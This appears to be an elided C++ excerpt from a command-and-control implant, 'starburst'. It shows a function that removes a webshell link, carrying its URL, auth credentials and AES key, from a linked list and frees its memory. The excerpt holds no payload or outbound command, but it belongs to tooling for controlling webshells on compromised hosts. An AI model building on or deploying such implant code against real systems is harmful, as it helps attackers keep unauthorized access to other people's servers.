...
auto declfn starburst::cmd_unlink_webshell(
    ...
    instance::WebshellLink* prev = nullptr;
    instance::WebshellLink* cur  = inst.webshell_links;
    bool found = false;

    while ( cur ) {
        if ( cur->agent_id && agent_uuid_len > 0 &&
             str_len( cur->agent_id ) == agent_uuid_len &&
             str_ncmp( cur->agent_id, agent_uuid, agent_uuid_len ) == 0 ) {

            if ( prev ) {
                prev->next = cur->next;
            } else {
                inst.webshell_links = cur->next;
            }

            DBG_PRINT( inst, "unlink_webshell: removed link_id=%d agent=%s\n",
            ...
            if ( cur->url )        inst.heap_free( cur->url );
            if ( cur->agent_id )   inst.heap_free( cur->agent_id );
            if ( cur->auth_name )  inst.heap_free( cur->auth_name );
            if ( cur->auth_value ) inst.heap_free( cur->auth_value );
            if ( cur->aes_key )    inst.heap_free( cur->aes_key );
            if ( cur->param_name ) inst.heap_free( cur->param_name );
            inst.heap_free( cur );
